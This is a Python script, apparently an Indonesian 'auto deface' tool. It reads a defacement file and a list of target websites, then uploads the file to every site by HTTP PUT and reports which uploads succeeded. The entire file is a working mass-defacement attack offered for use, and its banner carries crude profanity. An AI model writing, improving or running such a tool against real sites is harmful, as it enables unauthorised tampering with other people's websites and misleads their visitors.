#-*- coding: utf-8 -*-

try:
   import requests
   import os.path
   import sys
except ImportError:
   exit("ketik pip install requests...")

banner = """
<=×=×=×=×=×=×=×=×=×<×=×=×=×=×=×=×=×=>
        SELAMAT DATANG BANGSAT
<=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=>


                                                                                        
█████████
█▄█████▄█
█▼▼▼▼▼
█×=========> DUARRR MEMEK !
█▲▲▲▲▲
█████████
 ██ ██

<=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=>
         AUTO DEVACE PROJECT
<=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=×=>
"""

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def x(tetew):
   ipt = ''
   if sys.version_info.major > 2:
      ipt = input(tetew)
   else:
      ipt = raw_input(tetew)
   
   return str(ipt)

def aox(script,target_file="target.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("MERETAS %d WEBSITE"%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code < 200 or req.status_code >= 250:
               print(m+"["+b+" GAGAL :("+m+" ] %s/%s"%(site,script))
            else:
               print(m+"["+h+" BERHASIL :)"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   print(__bn__)
   while True:
      try:
         a = x("NAMA SCRIPT DEVACE COK : ")
         if not os.path.isfile(a):
            print("SCRIPT '%s' GAK ADA COK"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)

if __name__ == "__main__":
    main(banner)
